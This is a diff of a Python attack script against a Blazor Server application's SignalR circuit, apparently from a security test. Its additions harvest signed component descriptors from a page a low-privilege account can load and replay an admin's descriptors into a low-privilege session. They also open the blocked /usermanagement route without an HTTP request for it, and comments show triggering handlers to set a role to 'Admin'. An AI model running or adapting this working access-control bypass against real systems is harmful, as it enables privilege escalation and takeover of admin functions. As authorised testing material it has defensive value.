@@ -19,9 +19,11 @@ import json, re, time
 import requests, msgpack
 
 # ------------------------------- CONFIG --------------------------------
-BASE   = "https://target.example.com"
-PATH   = "/usermanagement"
-COOKIE = "PASTE_SESSION_COOKIE_HERE"      # swap this, nothing else
+BASE       = "https://target.example.com"
+PATH       = "/usermanagement"            # the blocked target route
+COOKIE     = "PASTE_SESSION_COOKIE_HERE"  # admin -- the one that already works
+LOW_COOKIE = "PASTE_LOW_PRIV_COOKIE_HERE"
+HARVEST    = "/"                          # a page the LOW account can load
 # ----------------------------------------------------------------------
 
 RS = b"\x1e"
@@ -122,7 +124,9 @@ def harvest(base, cookie, path):
     """Pull the DP-signed component descriptors + persisted state from page HTML.
     Descriptors cannot be forged, but a plain GET hands them to you."""
     s = requests.Session()
-    s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
+    s.headers["User-Agent"] = "Mozilla/5.0"
+    if cookie:
+        s.headers["Cookie"] = cookie        # falsy -> anonymous
     r = s.get(base.rstrip("/") + path, allow_redirects=False)
     marks = [json.loads(m) for m in re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S)]
     state = re.findall(r"<!--Blazor-Component-State:([A-Za-z0-9+/=]+)-->", r.text)
@@ -141,12 +145,30 @@ def harvest(base, cookie, path):
     return r, marks, state
 
 
+def probe(cookie, paths):
+    """Which routes hand THIS account usable descriptors? Pick a harvest page."""
+    s = requests.Session()
+    s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
+    print("[probe] status / markers per path")
+    for p in paths:
+        try:
+            r = s.get(BASE.rstrip("/") + p, allow_redirects=False, timeout=15)
+        except Exception as e:
+            print(f"  {p:<28} ERR {e}")
+            continue
+        n = len(re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S))
+        flag = "  <= usable as HARVEST" if n else ""
+        print(f"  {p:<28} {r.status_code}  markers={n}{flag}")
+
+
 # ------------------------------ circuit ---------------------------------
 class Circuit:
     def __init__(self, base, cookie):
         self.base = base.rstrip("/")
         self.s = requests.Session()
-        self.s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
+        self.s.headers["User-Agent"] = "Mozilla/5.0"
+        if cookie:
+            self.s.headers["Cookie"] = cookie   # falsy -> anonymous
         self.token = None
         self.circuit_id = None
         self.alive = False
@@ -291,23 +313,65 @@ class Circuit:
 
 
 # ------------------------------- driver ---------------------------------
-def run(cookie, label="run"):
-    print(f"\n{'=' * 60}\n  {label}\n{'=' * 60}")
-    _, marks, _ = harvest(BASE, cookie, PATH)
-    if not marks:
-        print("[-] no descriptors -- blocked at HTTP level, or not prerendered.\n"
-              "    Try an admin-harvested descriptor here to test identity binding.")
-        return None
+def run(cookie, label="run", harvest_path=None, target_uri=None,
+        navigate_to=None, marks=None, seconds=20):
+    """harvest_path : page whose descriptors we borrow -- must be reachable
+       target_uri   : uri handed to StartCircuit -- need NOT be reachable
+       navigate_to  : optional in-circuit OnLocationChanged once the circuit is up
+       marks        : supply descriptors directly (e.g. harvested as another user)
+    """
+    harvest_path = PATH if harvest_path is None else harvest_path
+    target_uri = target_uri or (BASE.rstrip("/") + harvest_path)
+    print(f"\n{'=' * 64}\n  {label}\n{'=' * 64}")
+
+    if marks is None:
+        r, marks, _ = harvest(BASE, cookie, harvest_path)
+        if not marks:
+            print(f"[-] no descriptors from {harvest_path} (HTTP {r.status_code}).")
+            print("    run probe() and set harvest_path= to a page this account loads.")
+            return None
+
     c = Circuit(BASE, cookie)
     c.negotiate()
     c.handshake()
-    c.start_circuit(BASE + PATH, marks)
-    c.pump(20)
+    print(f"[*] StartCircuit uri -> {target_uri}")
+    c.start_circuit(target_uri, marks)
+    c.pump(seconds)
+
+    if navigate_to:
+        print(f"\n[*] in-circuit OnLocationChanged -> {navigate_to}")
+        c.navigate(navigate_to)
+        c.pump(seconds)
     return c
 
 
 if __name__ == "__main__":
-    c = run(COOKIE)
+    TARGET = BASE.rstrip("/") + PATH
+
+    # -- 0. which pages can the low account harvest from?
+    # probe(LOW_COOKIE, ["/", "/dashboard", "/profile", "/home", PATH])
+
+    # -- A. baseline: admin straight at the target (this already works)
+    # c = run(COOKIE, "A: admin baseline")
+
+    # -- B. low-priv, borrowed descriptor, circuit pointed at the blocked route.
+    #       No HTTP request is ever made for PATH.
+    c = run(LOW_COOKIE, "B: low-priv / borrowed descriptor",
+            harvest_path=HARVEST, target_uri=TARGET)
+
+    # -- C. same, but arrive by in-circuit routing instead of the start uri
+    # c = run(LOW_COOKIE, "C: low-priv / in-circuit nav",
+    #         harvest_path=HARVEST, navigate_to=TARGET)
+
+    # -- D. admin's descriptor replayed into a low-priv circuit
+    #       (tests whether descriptors are bound to identity)
+    # _, admin_marks, _ = harvest(BASE, COOKIE, PATH)
+    # c = run(LOW_COOKIE, "D: admin descriptor / low-priv session",
+    #         target_uri=TARGET, marks=admin_marks)
+
+    # -- E. no cookie at all. Does the circuit require auth for anything?
+    # c = run("", "E: anonymous", harvest_path="/", target_uri=TARGET)
+
     # once a batch shows the table, fire row handlers:
     #   c.dispatch_event(47)                               # click
     #   c.dispatch_event(47, "change", field_value="Admin", component_id=5)
